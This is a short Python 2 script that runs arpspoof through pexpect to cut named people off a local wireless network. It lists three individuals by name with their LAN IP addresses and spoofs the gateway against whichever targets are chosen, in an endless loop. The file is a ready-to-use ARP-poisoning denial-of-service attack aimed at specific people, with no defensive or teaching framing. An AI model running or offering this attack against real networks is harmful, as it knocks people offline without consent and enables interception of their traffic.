#! /usr/bin/dev python

import optparse
import pexpect

IP = {
    'Huangxiao':'10.18.40.135',
    'Jianchuanjie':'10.18.40.147',
    'Shenghaodong':'10.18.40.151',
    'Me':'10.18.40.143'
    }

def cutNet(name):
    child = pexpect.spawn('arpspoof -i wlan0 -t '+IP[name]+' 10.18.40.129')
    if child.expect('arp')==0:
        print '[+] Cut '+name+' Successed !'
    else:
        print '[-] Cut '+name+' Failed !'
def main():
    parser = optparse.OptionParser('usage %prog -H <Huangxiao> -J <Jianchuanjie -S <Shenghaodong> -M <Me>' )
    parser.add_option('-H', '--huangxiao',  action = 'store_true', dest = 'Huangxiao' , help = 'Target: Huangxiao')
    parser.add_option('-J', '--chuanjie', action = 'store_true', dest = 'Jianchuanjie' , help= 'Target: Jianchuanjie' )
    parser.add_option('-S', '--haodong', action='store_true', dest='Shenghaodong', help='Target: Shenghaodong')
    parser.add_option('-M', '--Me', action='store_true', dest='Me', help='Target: Myself')
    (options,args)=parser.parse_args()
    while True:
        if options.Huangxiao:
            cutNet('Huangxiao')
        if options.Me:
            cutNet('Me')
        if options.Jianchuanjie:
            cutNet('Jianchuanjie')
        if options.Huangxiao:
            cutNet('Huangxiao')
        if options.Shenghaodong:
            cutNet('Shenghaodong')
if __name__ == '__main__':
    main()